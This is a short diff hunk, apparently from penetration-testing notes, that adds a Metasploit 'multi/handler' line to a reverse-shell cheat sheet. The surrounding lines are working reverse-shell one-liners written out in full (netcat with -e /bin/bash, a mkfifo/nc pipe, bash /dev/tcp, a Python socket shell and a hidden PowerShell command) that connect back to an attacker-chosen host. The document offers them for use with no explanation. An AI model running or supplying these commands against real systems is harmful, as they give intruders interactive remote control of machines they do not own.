@@ -1304,6 +1304,7 @@ $ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 $ nc -nv <IP address> <port> -e /bin/bash
+msf6 > use multi/handler
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
 $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
